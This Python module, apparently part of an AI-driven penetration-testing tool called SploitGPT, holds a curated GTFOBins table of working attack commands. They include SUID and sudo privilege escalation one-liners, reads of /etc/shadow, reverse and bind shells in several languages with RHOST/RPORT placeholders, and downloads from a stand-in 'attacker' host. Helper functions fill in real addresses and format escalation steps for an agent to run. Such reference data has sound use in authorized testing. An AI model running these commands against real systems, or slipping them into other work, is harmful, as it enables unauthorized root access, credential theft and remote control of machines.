"""
GTFOBins Integration

Provides shell escape and privilege escalation techniques for common binaries.
Data sourced from https://gtfobins.github.io/
"""

from dataclasses import dataclass


@dataclass
class GTFOBin:
    """A GTFOBins entry with privesc techniques."""
    name: str
    suid: str | None = None
    sudo: str | None = None
    shell: str | None = None
    file_read: str | None = None
    file_write: str | None = None
    reverse_shell: str | None = None
    bind_shell: str | None = None
    capabilities: str | None = None


# Common GTFOBins entries - a curated subset
# Full database can be fetched from the GTFOBins API
GTFOBINS_DB: dict[str, GTFOBin] = {
    "awk": GTFOBin(
        name="awk",
        suid="./awk 'BEGIN {system(\"/bin/sh\")}'",
        sudo="sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        shell="awk 'BEGIN {system(\"/bin/sh\")}'",
        file_read="awk '//' /etc/shadow",
        reverse_shell="awk 'BEGIN {s=\"/inet/tcp/0/RHOST/RPORT\";while(1){if((s|&getline c)<=0)break;while(c&&(c|&getline)>0)print|&s;close(c)}close(s)}'",
    ),
    "bash": GTFOBin(
        name="bash",
        suid="./bash -p",
        sudo="sudo bash",
        shell="bash",
    ),
    "cp": GTFOBin(
        name="cp",
        suid="./cp /etc/shadow /tmp/shadow && cat /tmp/shadow",
        sudo="sudo cp /etc/shadow /tmp/shadow",
        file_read="cp /etc/shadow /dev/stdout",
    ),
    "curl": GTFOBin(
        name="curl",
        suid="./curl file:///etc/shadow",
        sudo="sudo curl file:///etc/shadow",
        file_read="curl file:///etc/shadow",
        file_write="curl -o /path/to/file http://attacker/file",
    ),
    "docker": GTFOBin(
        name="docker",
        suid="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        sudo="sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        shell="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    ),
    "find": GTFOBin(
        name="find",
        suid="./find . -exec /bin/sh \\; -quit",
        sudo="sudo find . -exec /bin/sh \\; -quit",
        shell="find . -exec /bin/sh \\; -quit",
    ),
    "ftp": GTFOBin(
        name="ftp",
        suid="./ftp\n!/bin/sh",
        sudo="sudo ftp\n!/bin/sh",
    ),
    "gcc": GTFOBin(
        name="gcc",
        shell="gcc -wrapper /bin/sh,-s .",
    ),
    "gdb": GTFOBin(
        name="gdb",
        suid="./gdb -nx -ex '!sh' -ex quit",
        sudo="sudo gdb -nx -ex '!sh' -ex quit",
        shell="gdb -nx -ex '!sh' -ex quit",
        capabilities="./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
    ),
    "git": GTFOBin(
        name="git",
        suid="PAGER='sh -c \"exec sh 0<&1\"' ./git -p help",
        sudo="PAGER='sh -c \"exec sh 0<&1\"' sudo git -p help",
    ),
    "less": GTFOBin(
        name="less",
        suid="./less /etc/passwd\n!/bin/sh",
        sudo="sudo less /etc/passwd\n!/bin/sh",
        shell="less /etc/passwd\n!/bin/sh",
        file_read="less /etc/shadow",
    ),
    "man": GTFOBin(
        name="man",
        suid="./man man\n!/bin/sh",
        sudo="sudo man man\n!/bin/sh",
    ),
    "more": GTFOBin(
        name="more",
        suid="./more /etc/passwd\n!/bin/sh",
        sudo="TERM=xterm sudo more /etc/passwd\n!/bin/sh",
    ),
    "mount": GTFOBin(
        name="mount",
        sudo="sudo mount -o bind /bin/sh /bin/mount\nsudo mount",
    ),
    "nano": GTFOBin(
        name="nano",
        suid="./nano\n^R^X\nreset; sh 1>&0 2>&0",
        sudo="sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
        file_read="nano /etc/shadow",
        file_write="nano /etc/passwd",
    ),
    "nc": GTFOBin(
        name="nc",
        reverse_shell="nc -e /bin/sh RHOST RPORT",
        bind_shell="nc -lnvp LPORT -e /bin/sh",
    ),
    "netcat": GTFOBin(
        name="netcat",
        reverse_shell="netcat -e /bin/sh RHOST RPORT",
        bind_shell="netcat -lnvp LPORT -e /bin/sh",
    ),
    "nmap": GTFOBin(
        name="nmap",
        suid="./nmap --interactive\n!sh",
        sudo="sudo nmap --interactive\n!sh",
        shell="nmap --script=<(echo 'os.execute(\"/bin/sh\")')",  # nmap 5.x
    ),
    "perl": GTFOBin(
        name="perl",
        suid="./perl -e 'exec \"/bin/sh\";'",
        sudo="sudo perl -e 'exec \"/bin/sh\";'",
        shell="perl -e 'exec \"/bin/sh\";'",
        reverse_shell="perl -e 'use Socket;$i=\"RHOST\";$p=RPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    ),
    "php": GTFOBin(
        name="php",
        suid="./php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
        sudo="CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"",
        shell="php -r \"system('/bin/sh');\"",
        reverse_shell="php -r '$s=fsockopen(\"RHOST\",RPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    ),
    "pip": GTFOBin(
        name="pip",
        sudo="TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF",
    ),
    "python": GTFOBin(
        name="python",
        suid="./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
        sudo="sudo python -c 'import os; os.system(\"/bin/sh\")'",
        shell="python -c 'import os; os.system(\"/bin/sh\")'",
        reverse_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        capabilities="./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    ),
    "python3": GTFOBin(
        name="python3",
        suid="./python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
        sudo="sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        shell="python3 -c 'import os; os.system(\"/bin/sh\")'",
        reverse_shell="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    ),
    "ruby": GTFOBin(
        name="ruby",
        suid="./ruby -e 'exec \"/bin/sh -p\"'",
        sudo="sudo ruby -e 'exec \"/bin/sh\"'",
        shell="ruby -e 'exec \"/bin/sh\"'",
        reverse_shell="ruby -rsocket -e'f=TCPSocket.open(\"RHOST\",RPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    ),
    "rvim": GTFOBin(
        name="rvim",
        sudo="sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
    ),
    "scp": GTFOBin(
        name="scp",
        suid="TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF x y:",
        sudo="TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:",
    ),
    "sed": GTFOBin(
        name="sed",
        suid="./sed -n '1e exec sh 1>&0' /etc/hosts",
        sudo="sudo sed -n '1e exec sh 1>&0' /etc/hosts",
    ),
    "socat": GTFOBin(
        name="socat",
        reverse_shell="socat TCP:RHOST:RPORT EXEC:/bin/sh",
        bind_shell="socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/sh",
    ),
    "ssh": GTFOBin(
        name="ssh",
        sudo="sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        shell="ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    ),
    "strace": GTFOBin(
        name="strace",
        suid="./strace -o /dev/null /bin/sh",
        sudo="sudo strace -o /dev/null /bin/sh",
    ),
    "tar": GTFOBin(
        name="tar",
        suid="./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        sudo="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    ),
    "tclsh": GTFOBin(
        name="tclsh",
        suid="./tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr",
        sudo="sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr",
    ),
    "vi": GTFOBin(
        name="vi",
        suid="./vi -c ':!/bin/sh' /dev/null",
        sudo="sudo vi -c ':!/bin/sh' /dev/null",
        shell="vi -c ':!/bin/sh'",
    ),
    "vim": GTFOBin(
        name="vim",
        suid="./vim -c ':!/bin/sh'",
        sudo="sudo vim -c ':!/bin/sh'",
        shell="vim -c ':!/bin/sh'",
    ),
    "watch": GTFOBin(
        name="watch",
        suid="./watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
        sudo="sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
    ),
    "wget": GTFOBin(
        name="wget",
        file_read="wget -q -O- file:///etc/shadow",
        file_write="wget http://attacker/file -O /path/to/file",
    ),
    "xargs": GTFOBin(
        name="xargs",
        suid="./xargs -a /dev/null sh",
        sudo="sudo xargs -a /dev/null sh",
    ),
    "xxd": GTFOBin(
        name="xxd",
        file_read="xxd /etc/shadow | xxd -r",
    ),
    "zip": GTFOBin(
        name="zip",
        suid="TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nrm $TF",
        sudo="TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nrm $TF",
    ),
}


def find_suid_escalation(binary: str) -> str | None:
    """Find SUID privesc technique for a binary."""
    binary_name = binary.split("/")[-1].lower()
    if binary_name in GTFOBINS_DB:
        return GTFOBINS_DB[binary_name].suid
    return None


def find_sudo_escalation(binary: str) -> str | None:
    """Find sudo privesc technique for a binary."""
    binary_name = binary.split("/")[-1].lower()
    if binary_name in GTFOBINS_DB:
        return GTFOBINS_DB[binary_name].sudo
    return None


def find_reverse_shell(binary: str, rhost: str, rport: int) -> str | None:
    """Get reverse shell command for a binary."""
    binary_name = binary.split("/")[-1].lower()
    if binary_name in GTFOBINS_DB:
        shell = GTFOBINS_DB[binary_name].reverse_shell
        if shell:
            return shell.replace("RHOST", rhost).replace("RPORT", str(rport))
    return None


def get_privesc_options(binaries: list[str], method: str = "suid") -> list[dict[str, str]]:
    """
    Get privesc options for a list of binaries.
    
    Args:
        binaries: List of binary paths (e.g., from find -perm -4000)
        method: 'suid', 'sudo', or 'capabilities'
        
    Returns:
        List of {binary, technique, command} dicts
    """
    options: list[dict[str, str]] = []
    
    for binary in binaries:
        binary_name = binary.split("/")[-1].lower()
        if binary_name not in GTFOBINS_DB:
            continue
        
        entry = GTFOBINS_DB[binary_name]
        
        if method == "suid" and entry.suid:
            options.append({
                "binary": binary,
                "technique": "SUID",
                "command": entry.suid.replace("./", binary.rsplit("/", 1)[0] + "/"),
            })
        elif method == "sudo" and entry.sudo:
            options.append({
                "binary": binary,
                "technique": "sudo",
                "command": entry.sudo,
            })
        elif method == "capabilities" and entry.capabilities:
            options.append({
                "binary": binary,
                "technique": "capabilities",
                "command": entry.capabilities.replace("./", binary.rsplit("/", 1)[0] + "/"),
            })
    
    return options


def format_privesc_for_agent(binaries: list[str]) -> str:
    """Format GTFOBins findings for the agent."""
    suid_options = get_privesc_options(binaries, "suid")
    
    if not suid_options:
        return "No known GTFOBins techniques for these SUID binaries."
    
    lines = ["**Potential Privilege Escalation via SUID:**\n"]
    
    for i, opt in enumerate(suid_options, 1):
        lines.append(f"**Option {i}: {opt['binary']}**")
        lines.append("```bash")
        lines.append(f"{opt['command']}")
        lines.append("```")
        lines.append("")
    
    return "\n".join(lines)


async def download_gtfobins_data(force: bool = False) -> int:
    """Ensure GTFOBins data is available locally.

    Today SploitGPT ships a curated in-code subset of GTFOBins to avoid
    network dependencies at runtime.

    This async function exists to keep the installer compatible.

    Args:
        force: Reserved for future use (re-download full dataset).

    Returns:
        Number of GTFOBins entries available.
    """

    _ = force
    return len(GTFOBINS_DB)
